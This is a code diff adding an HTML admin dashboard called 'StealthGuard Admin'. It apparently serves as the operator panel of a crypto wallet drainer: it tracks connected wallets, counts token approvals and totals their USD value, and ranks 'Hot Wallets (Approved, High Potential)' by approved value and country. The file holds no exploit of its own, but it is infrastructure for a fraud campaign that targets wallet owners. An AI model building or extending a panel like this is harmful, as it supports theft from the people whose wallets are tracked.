@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>StealthGuard Admin</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      padding: 20px;
+    }
+    .header {
+      background: #161b22;
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #30363d;
+    }
+    .header h1 { color: #00ff9f; margin-bottom: 10px; }
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+    .stat-card {
+      background: #161b22;
+      padding: 20px;
+      border-radius: 12px;
+      border: 1px solid #30363d;
+    }
+    .stat-card h3 { color: #8b949e; font-size: 12px; text-transform: uppercase; }
+    .stat-card .value { font-size: 32px; font-weight: bold; color: #00ff9f; margin-top: 5px; }
+    .section {
+      background: #161b22;
+      padding: 20px;
+      border-radius: 12px;
+      border: 1px solid #30363d;
+      margin-bottom: 20px;
+    }
+    .section h2 { color: #fff; margin-bottom: 15px; font-size: 16px; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+    th, td {
+      padding: 10px;
+      text-align: left;
+      border-bottom: 1px solid #30363d;
+    }
+    th { color: #8b949e; font-weight: 500; }
+    .badge {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 500;
+    }
+    .badge-success { background: #238636; color: #fff; }
+    .badge-warning { background: #9e6a03; color: #fff; }
+    .badge-error { background: #da3633; color: #fff; }
+    .country-flag { font-size: 16px; margin-right: 5px; }
+    .amount { color: #00ff9f; font-weight: 500; }
+    .wallet { font-family: monospace; font-size: 11px; color: #58a6ff; }
+    .refresh { float: right; background: #238636; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+    .refresh:hover { background: #2ea043; }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>🛡️ StealthGuard Admin</h1>
+    <p>Real-time monitoring dashboard</p>
+    <button class="refresh" onclick="loadData()">🔄 Refresh</button>
+  </div>
+
+  <div class="stats-grid">
+    <div class="stat-card">
+      <h3>Total Connections</h3>
+      <div class="value" id="totalConnections">-</div>
+    </div>
+    <div class="stat-card">
+      <h3>Today</h3>
+      <div class="value" id="todayConnections">-</div>
+    </div>
+    <div class="stat-card">
+      <h3>Approvals</h3>
+      <div class="value" id="approvedCount">-</div>
+    </div>
+    <div class="stat-card">
+      <h3>Total Value</h3>
+      <div class="value" id="totalUSD">$-</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>🌍 Top Countries</h2>
+    <table id="countriesTable">
+      <thead>
+        <tr>
+          <th>Country</th>
+          <th>Connections</th>
+          <th>%</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <div class="section">
+    <h2>💰 Amount Distribution</h2>
+    <table id="amountsTable">
+      <thead>
+        <tr>
+          <th>Range</th>
+          <th>Count</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <div class="section">
+    <h2>🔥 Hot Wallets (Approved, High Potential)</h2>
+    <table id="walletsTable">
+      <thead>
+        <tr>
+          <th>Wallet</th>
+          <th>Type</th>
+          <th>Approved Value</th>
+          <th>Country</th>
+          <th>Last Seen</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <script>
+    const API_URL = 'http://localhost:3000/api';
+
+    async function loadData() {
+      try {
+        // Dashboard stats
+        const dash = await fetch(`${API_URL}/dashboard`).then(r => r.json());
+        document.getElementById('totalConnections').textContent = dash.totalConnections.toLocaleString();
+        document.getElementById('todayConnections').textContent = dash.todayConnections.toLocaleString();
+        document.getElementById('approvedCount').textContent = dash.approvedCount.toLocaleString();
+        document.getElementById('totalUSD').textContent = '$' + (dash.totalUSD || 0).toLocaleString(undefined, {maximumFractionDigits: 0});
+
+        // Countries
+        const countries = await fetch(`${API_URL}/stats/countries`).then(r => r.json());
+        const total = countries.reduce((a, b) => a + b.count, 0);
+        document.querySelector('#countriesTable tbody').innerHTML = countries.map(c => `
+          <tr>
+            <td><span class="country-flag">🏳️</span> ${c.country}</td>
+            <td>${c.count.toLocaleString()}</td>
+            <td>${((c.count / total) * 100).toFixed(1)}%</td>
+          </tr>
+        `).join('');
+
+        // Amounts
+        const amounts = await fetch(`${API_URL}/stats/amounts`).then(r => r.json());
+        document.querySelector('#amountsTable tbody').innerHTML = amounts.map(a => `
+          <tr>
+            <td>${a.range}</td>
+            <td><span class="badge badge-success">${a.count}</span></td>
+          </tr>
+        `).join('');
+
+        // Hot wallets
+        const wallets = await fetch(`${API_URL}/wallets/hot`).then(r => r.json());
+        document.querySelector('#walletsTable tbody').innerHTML = wallets.map(w => `
+          <tr>
+            <td class="wallet">${w.address.slice(0, 6)}...${w.address.slice(-4)}</td>
+            <td>${w.walletType || 'Unknown'}</td>
+            <td class="amount">$${w.totalApprovedUSD.toFixed(2)}</td>
+            <td>${w.country || 'Unknown'}</td>
+            <td>${new Date(w.lastSeen).toLocaleString()}</td>
+          </tr>
+        `).join('');
+
+      } catch (error) {
+        console.error('Load error:', error);
+      }
+    }
+
+    // Load on start
+    loadData();
+    
+    // Auto refresh every 30 seconds
+    setInterval(loadData, 30000);
+
+    // WebSocket for real-time updates
+    const ws = new WebSocket('ws://localhost:3000');
+    ws.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      console.log('Real-time:', data);
+      // Could add toast notification here
+    };
+  </script>
+</body>
+</html>
